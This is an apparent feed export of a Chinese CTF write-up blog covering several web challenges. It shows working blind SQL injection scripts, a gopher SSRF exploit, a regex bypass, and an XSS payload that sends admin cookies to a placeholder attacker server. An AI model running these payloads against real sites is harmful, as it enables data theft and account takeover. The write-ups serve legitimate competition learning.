punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Wrong.'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>If your guess is correct, I'll give you the flag.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?source<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Source<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$message</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>guess<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>通过<code>highlight_file</code>读取<code>config.php</code><br>但被过了，需要个字符绕过*的匹配</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/index.php/config.php/'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$t</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/index.php/config.php/'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"$&#123;i&#125;: $&#123;t&#125;\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>payload:<code>/index.php/config.php/%80?source</code></p><h2 id="easy-sql-1"><a href="#easy-sql-1" class="headerlink" title="easy_sql_1"></a>easy_sql_1</h2><p>进去有个<code>use.php</code>,ssrf，但<code>index.php</code>的表单提交不了，没反应</p><p>要用gopher协议打post<br>然后adminadmin登录后发现给了<br><code>cookie:this_is_your_cookie=YWRtaW4=</code>，把cookie带上</p><p>cookie存在sql注入</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotedata<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST / HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedCookie: this_is_your_cookie=LTEnKXx8dXBkYXRleG1sKDEsY29uY2F0KDEsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZykgZnJvbSBmbGFnKSwxKSwxKSM=;PHPSESSID=susn9dj4f1806v0pl5oiureek1;Content-Length: &#123;&#125;&#123;&#125;"""</span>payload<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span>length<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>data<span class="token operator">=</span>data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>data<span class="token operator">=</span>quote<span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">"http://182.116.62.85:28303/use.php"</span>params<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'url'</span><span class="token punctuation">:</span><span class="token string">"gopher://127.0.0.1:80/_"</span><span class="token operator">+</span>data<span class="token punctuation">&#125;</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">"PHPSESSID=8t4ppbs8ek3l5v5estgbttqtu3"</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>WAF:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'try again!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>注库名：</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>&#123;i&#125;<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>&#123;val&#125;</code></pre><p>tables被过，不能用<code>information_schema.tables</code>;</p><p>mysql8中有<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>;以此获取表名</p><pre class="language-sql" data-language="sql"><code class="language-sql">admin' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"ctf"</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">table</span> mysql<span class="token punctuation">.</span>innodb_index_stats <span class="token keyword">order</span> <span class="token keyword">by</span> last_update <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p>select 被过，用MySQL8的table语句</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">TABLE</span> table_name <span class="token punctuation">[</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column_name<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> number <span class="token punctuation">[</span><span class="token keyword">OFFSET</span> number<span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p><ul><li><code>table</code>总是显示表的所有列</li><li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">admin' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"ctf"</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">table</span> mysql<span class="token punctuation">.</span>innodb_index_stats <span class="token keyword">order</span> <span class="token keyword">by</span> last_update <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p>注数据</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>hex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">table</span> fl11aag <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>&#123;i&#125;<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>&#123;val&#125;</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">def</span> <span class="token function">strtohex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    ss <span class="token operator">=</span> <span class="token string">"0x"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        ss <span class="token operator">+=</span>  <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ssurl<span class="token operator">=</span><span class="token string">"http://182.116.62.85:26571/login.php"</span>flag<span class="token operator">=</span><span class="token string">"flag&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#for j in ".-0123456789abcdefghijklmnopqrstuvwxyz0123456789&#123;|&#125;~":</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#payload="-1'||(('def','ctf','fl11aag','&#123;&#125;','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table/**/information_schema.columns/**/limit/**/3,1))#".format(flag+j)</span>        payload<span class="token operator">=</span><span class="token string">"-1'||((binary/**/&#123;&#125;)&lt;(table/**/ctf.fl11aag/**/limit/**/1,1))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>strtohex<span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#print(r.text)</span>        <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> <span class="token string">"try"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token comment">#print(r.text)</span>            <span class="token comment">#print(payload)</span>            <span class="token comment">#print(j)</span>            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p><a href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;middle-magic&quot;&gt;&lt;a href=&quot;#middle-magic&quot; class=&quot;headerlink&quot; title=&quot;middle_magic&quot;&gt;&lt;/a&gt;middle_magic&lt;/h2&gt;&lt;pre class=&quot;language-php&quot; data-la</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="鹤城杯" scheme="http://lll-nnn.github.io/categories/CTF/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>DownUnderCTF</title>
    <link href="http://lll-nnn.github.io/2021/09/28/DownUnderCTF/"/>
    <id>http://lll-nnn.github.io/2021/09/28/DownUnderCTF/</id>
    <published>2021-09-28T03:24:23.000Z</published>
    <updated>2021-10-10T09:16:43.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Chainreaction"><a href="#Chainreaction" class="headerlink" title="Chainreaction"></a>Chainreaction</h2><p>进去后有登录注册，登录注册后进入到个人主页<br><img src="https://s3.bmp.ovh/imgs/2021/09/1cd2c4250830e0a1.png">      </p><p>这样一句话<code>Report a problem on this page and an admin will check out the page for any problems</code><br>XSS了吧   </p><p>就是XSS反弹admin的cookie了     </p><p>aboutme那里有过滤<code>&lt;&gt;</code>、<code>script</code></p><p>dirsearch扫到<code>/dev</code><br><code>Dev portal is still under construction. If you already have had account provisioned head over to /devchat or head to /admin if you are a site admin</code></p><p><code>/devchat</code><br><img src="https://s3.bmp.ovh/imgs/2021/09/9c839dfe5bda5f17.png"><br>提到Unicode的问题      </p><p>WP中aboutme那里的绕过用的是Unicode同型字，在这个网站<code>https://www.irongeek.com/homoglyph-attack-generator.php</code>   </p><p>比如<code>&lt;</code>的同型字：<br><img src="https://s3.bmp.ovh/imgs/2021/09/453d673bc3b74b6d.png">   </p><p>以此来绕过过滤<br><code>&quot;＞＜Ｓcript＞alert(1)＜/Ｓcript＞</code>    </p><p>payload:<code>&quot;＞＜Ｓcript＞var i = new Image;i.src=&quot;https://[my-server-url]?&quot;+document.cookie＜/Ｓcript＞</code>     </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Chainreaction&quot;&gt;&lt;a href=&quot;#Chainreaction&quot; class=&quot;headerlink&quot; title=&quot;Chainreaction&quot;&gt;&lt;/a&gt;Chainreaction&lt;/h2&gt;&lt;p&gt;进去后有登录注册，登录注册后进入到个人主页&lt;br&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="DownUnderCTF" scheme="http://lll-nnn.github.io/categories/CTF/DownUnderCTF/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>PwnThyBytes 2019 Baby_SQL</title>
    <link href="http://lll-nnn.github.io/2021/09/20/BUU95/"/>
    <id>http://lll-nnn.github.io/2021/09/20/BUU95/</id>
    <published>2021-09-20T13:59:01.000Z</published>
    <updated>2021-09-20T14:15:16.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>首页源码由注释<code>/source.zip</code></p><p><code>login.php</code>里的SQL语句<br><img src="https://s3.bmp.ovh/imgs/2021/09/825f257913ec9b01.png">       </p><p>但<code>index.php</code>里有过滤<br><img src="https://s3.bmp.ovh/imgs/2021/09/3ebd4db23b9bee97.png">     </p><p><code>addslashes</code>函数会转义字符<br>有个<code>session_start()</code>函数<br>看WP说可以伪造<code>session</code>直接访问<code>login.php</code>从而绕过<code>index.php</code>中的过滤</p><p><strong>在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</strong>     </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php"</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">&#125;</span>a <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                  cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"test1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                  proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:8080"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>然后在Burp中改<code>username=1&#39;%22%20or%20sleep(4)%23</code>成功延时    </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timefiles<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'1234567'</span><span class="token punctuation">&#125;</span>url<span class="token operator">=</span><span class="token string">'http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php'</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    low<span class="token operator">=</span><span class="token number">32</span>    high<span class="token operator">=</span><span class="token number">128</span>    mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>low<span class="token operator">&lt;</span>high<span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.6</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr(database(),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        payload_table<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ptbctf'),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        payload_column<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag_tbl'),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        payload_data<span class="token operator">=</span><span class="token string">"1'\" or ascii(substr((select group_concat(secret) from ptbctf.flag_tbl),&#123;&#125;,1))>&#123;&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        a<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">,</span>                    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'123456'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span><span class="token string">'test1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123123'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;meta http-equiv="refresh" content="0; url=?p=home" />'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            low<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high<span class="token operator">=</span>mid        mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">==</span><span class="token number">32</span> <span class="token keyword">or</span> mid<span class="token operator">==</span><span class="token 